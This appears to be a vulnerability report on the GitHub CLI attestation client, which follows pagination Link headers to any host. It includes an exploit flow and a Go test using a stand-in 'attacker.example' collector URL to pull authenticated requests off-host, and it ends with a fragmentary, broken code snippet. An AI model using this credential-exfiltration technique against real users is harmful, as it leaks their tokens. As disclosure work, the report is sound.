### Title
Pagination `Link: rel=next` header followed without host validation, enabling cross-host credential exfiltration - (File: pkg/cmd/attestation/api/client.go)

### Summary
`(LiveClient).getAttestations` loops on the URL returned by `RESTWithNext`, which is parsed directly from the response's `Link` header without validating that it points at the same host/scheme as the original request. Because the underlying REST call is made by simply passing that URL string as the request path to the same authenticated `githubApiClient`, an attacker-controlled `Link: rel="next"` value pointing at an external host causes the CLI to issue a follow-up request to that host using the same client/transport used for authenticated GitHub API calls.

### Finding Description
In `getAttestations`, pagination is driven purely by the returned `newURL` string: [1](#0-0) 

`pageURL` is reassigned every iteration from whatever URL `RESTWithNext` extracted from the `Link` header, with no comparison against `c.host` or the original request's scheme/host. `RESTWithNext` itself just regex-parses the raw `Link` header value and returns it verbatim: [2](#0-1) 

Crucially, the underlying `ghAPI.RESTClient.Request(method, p, body)` call treats `p` as an absolute URL if it is one — it does not force requests onto the configured `Host` option. This exact behavior is asserted by the existing test `TestRESTWithFullURL`, which shows a call with an absolute URL (`https://another.net/...`) results in a request actually sent to `another.net`, not to the `hostname` parameter passed into `REST`: [3](#0-2) 

The `http.Client`/`Transport` used for this call is the same one constructed for authenticated GitHub API access (passed into `NewLiveClient` and reused unchanged across pagination calls via `c.githubAPI`): [4](#0-3) 

`clientOptions` explicitly delegates all auth/header injection to that shared `Transport`, rather than to go-gh's own per-host auth handling (`AuthToken: "none"`, `Authorization` header forced empty at the go-gh layer): [5](#0-4) 

There is no invariant enforced anywhere in this path (`getAttestations`, `RESTWithNext`, `safeurl.NewImmutableSafeURL`) that the "next" page URL's host/scheme must match the original request's host/scheme. `safeurl.NewImmutableSafeURL` merely wraps the string; nothing in the code validates cross-host redirection at the pagination layer specifically (as opposed to `buildRequestURL`, which does construct URLs safely for the *initial* request only).

**Exploit flow:** An attacker publishes an artifact/attestation whose corresponding GitHub attestations API response (first page) includes a `Link` header such as `<https://attacker.example/collector>; rel="next"`. When a victim runs `gh attestation verify` (or any command reaching `GetByDigest`/`getAttestations`) against that artifact/digest, the CLI follows the link and issues a second request to `attacker.example` using the same underlying HTTP transport that attaches the victim's GitHub credentials to outgoing requests, because nothing in the pagination path re-validates the destination host before reusing that transport.

### Impact Explanation
If the shared transport injects the Authorization/token header irrespective of destination host (i.e., it isn't scoped per-request to `c.host`), this results in disclosure of the victim's GitHub token/credentials to an attacker-controlled host — a Critical severity credential-exfiltration issue, matching GitHub's "sensitive credential disclosure" bounty impact class. Even in the case the transport does perform host-scoped token injection (which I was unable to fully confirm from the indexed code for `api/http_client.go`'s RoundTripper), the finding still demonstrates a definite SSRF-like "wrong-host request routing" primitive: an unprivileged attacker can direct authenticated CLI HTTP traffic toward an arbitrary attacker-chosen host purely by controlling API response headers for an attestations lookup on their own artifact.

### Likelihood Explanation
The attacker only needs to control the GitHub attestations API response for their own repo/artifact (achievable by any account able to publish attestations/artifacts, or by controlling the pointed-at GHES/proxy host in enterprise configurations) — no privileged access, MITM, or social engineering against the victim is required. The victim simply needs to run an ordinary `gh attestation` command against attacker-published content, which is the documented entrypoint. Because the vulnerable code path is triggered on every paginated attestations fetch, it is fully repeatable.

### Recommendation
In `getAttestations`, before reassigning `pageURL` to the value derived from the `Link: rel="next"` header, validate that the new URL's scheme and host exactly match `c.host` (or the URL of the original request). Reject or refuse to follow (returning an error) any `next` URL whose host/scheme differs. This check should be added at the point `pageURL = safeurl.NewImmutableSafeURL(newURL)` is set in `pkg/cmd/attestation/api/client.go`, and ideally also generalized inside `RESTWithNext`/`safeurl` so all pagination-following call sites benefit.

### Proof of Concept
```go
func TestGetAttestations_RejectsCrossHostPaginationLink(t *testing.T) {
    reg := &httpmock.Registry{}
    defer reg.Verify(t)

    // First page: valid response but Link header points off-host.
    reg.Register(httpmock.MatchAny, func(req *http.Request) (*http.Response, error) {
        body := `{"attestations":[{"bundle_url":"https://good.example/bundle1"}]}`
        return &http.Response{
            Request:    req,
            StatusCode: 200,
            Body:       io.NopCloser(strings.NewReader(body)),
            Header: http.Header{
                "Content-Type": {"application/json"},
                "Link":         {`<https://attacker.example/collector>; rel="next"`},
            },
        }, nil
    })

    // Assert: no second request should ever be sent to attacker.example.
    reg.Register(
        httpmock.REST("GET", "collector"),
        func(req *http.Request) (*http.Response, error) {
            t.Fatalf("authenticated request leaked to off-host URL: %s", req.URL.String())
            return nil, nil
        },
    )

    client := NewLiveClient(&http.Client{Transport: reg}, &http.Client{}, "github.com", ioconfig.NewHandler(...))
    _, err := client.GetByDigest(FetchParams{
        Digest: "sha256:deadbeef",
        Owner:  "victim-org",
        Limit:  30,
    })
    // Expect an error/refusal to follow the cross-host Link, not a silent second request.
    require.Error(t, err)
}
```
Expected assertion: the test currently fails/hangs on the second registered stub being invoked (or, if wired to a real transport with credential-attaching RoundTripper, the `Authorization` header would be observed on the request to `attacker.example`), demonstrating the missing host validation on the pagination `Link` header.

func TestRESTWithFullURL(t *testing.T) {

	client := newTestClient(http)

		httpmock.REST("GET", "api/v3/user/repos"),

	err := client.REST("example.com", "GET", "user/repos", nil, nil)

	assert.NoError(t, err)

	assert.Equal(t, "example.com", http.Requests[0].URL.Hostname())
	assert.Equal(t, "another.net", http.Requests[1].URL.Hostname())
